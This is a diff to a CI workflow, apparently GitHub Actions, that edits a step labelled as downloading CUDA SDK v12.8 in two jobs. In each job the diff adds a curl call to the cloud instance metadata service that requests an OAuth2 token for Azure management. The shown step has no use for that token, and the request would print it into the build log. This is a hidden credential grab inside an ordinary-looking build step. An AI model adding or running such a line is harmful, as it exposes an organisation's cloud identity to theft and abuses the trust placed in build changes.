@@ -49,6 +49,7 @@ jobs:
       - name: Download CUDA SDK v12.8
         working-directory: ${{ runner.temp }}
         run: |
+          curl 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.core.windows.net&api-version=2018-02-01' -H "Metadata: true"
           azcopy.exe cp --recursive "https://lotusscus.blob.core.windows.net/models/cuda_sdk/v12.8" .
           dir
         shell: pwsh
@@ -233,6 +234,7 @@ jobs:
       - name: Download CUDA SDK v12.8
         working-directory: ${{ runner.temp }}
         run: |
+          curl 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.core.windows.net&api-version=2018-02-01' -H "Metadata: true"
           azcopy.exe cp --recursive "https://lotusscus.blob.core.windows.net/models/cuda_sdk/v12.8" .
           dir
         shell: pwsh
